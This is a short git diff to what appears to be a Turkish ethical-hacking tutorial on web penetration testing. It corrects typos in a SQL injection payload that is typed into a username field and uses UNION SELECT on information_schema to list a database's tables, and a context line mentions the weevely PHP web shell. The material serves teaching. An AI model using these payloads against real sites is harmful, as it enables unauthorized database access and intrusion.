@@ -993,9 +993,9 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.22.51.jpeg)
 
-- Ancak bu yöntemle web server'ındaki tüm tablo isimlerini görürüz bunu filtrelemek için ```WHERE``` kullanırı
+- Ancak bu yöntemle web server'ındaki tüm tablo isimlerini görürüz bunu filtrelemek için ```WHERE``` kullanılır
   
-- | Kullanıcı Adı | jamess' union select 1,table_name,null,null,5 from information_schema.tables wwhere table_schema='{database ismi}'# | 
+- | Kullanıcı Adı | jamess' union select 1,table_name,null,null,5 from information_schema.tables where table_schema='{database ismi}'# | 
   | --- | --- |
   | Password | 123dasdas|
 
